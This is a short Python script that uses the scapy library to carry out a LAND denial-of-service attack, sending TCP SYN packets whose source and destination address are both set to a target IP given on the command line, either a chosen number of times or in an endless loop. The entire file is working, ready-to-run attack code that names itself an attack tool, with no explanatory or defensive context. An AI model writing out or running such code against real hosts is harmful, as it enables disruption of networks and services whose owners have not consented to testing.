# #!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Project -> @File : Abnormal -> landbase.py
# @Author   : Taknife
# @IDE      : PyCharm
# @Time     : 2022/9/24 4:06

"""
-------------------- Function --------------------
Desc: 
---------------------- End -----------------------
"""

import argparse
import random
from scapy.all import *


def get_parser():
    parser = argparse.ArgumentParser(description='Execute Land-Base attack.')
    parser.add_argument("-d", "--dst", type=str, metavar="[xxx.xxx.xxx.xxx]", help="Target IP address.")
    parser.add_argument("-n", "--num", type=int, metavar="number", help="Number of packets sent.")
    parser.add_argument("-t", "--time", type=int, metavar="second", default=0, help="Time interval between sending request packets.")
    args = parser.parse_args()
    dst = args.dst
    num = args.num
    tim = args.time
    return dst, num, tim


def crafting_packets(target):
    # data_link_layer = Ether(
    #     src = smac
    # )
    network_layer = IP(
        src = target,
        dst = target
    )
    transport_layer = TCP(
        sport = random.randint(1000, 65535),
        dport = random.randint(1000, 65535),
        flags = "S"
    )
    pkt = network_layer / transport_layer
    return pkt


def send_packers(pkt):
    send(pkt)

def non_stop_contracting(dst):
    while True:
        parser = get_parser()
        tim = parser[2]
        pkt = crafting_packets(dst)
        send_packers(pkt)
        time.sleep(tim)


if __name__ == '__main__':
    parser = get_parser()
    dst = parser[0]
    num = parser[1]
    tim = parser[2]
    if dst:
        pkt = crafting_packets(dst)
        if num:
            for i in range(num):
                try:
                    send_packers(pkt)
                    time.sleep(tim)
                except KeyboardInterrupt:
                    print("")
                    print("---------- Stop the attack. ----------\n")
        else:
            try:
                non_stop_contracting(dst)
            except KeyboardInterrupt:
                print("")
                print("---------- Stop the attack. ----------\n")
    else:
        print("Tips: Please enter the IP address of the target.(-d, --dst)")
        sys.exit()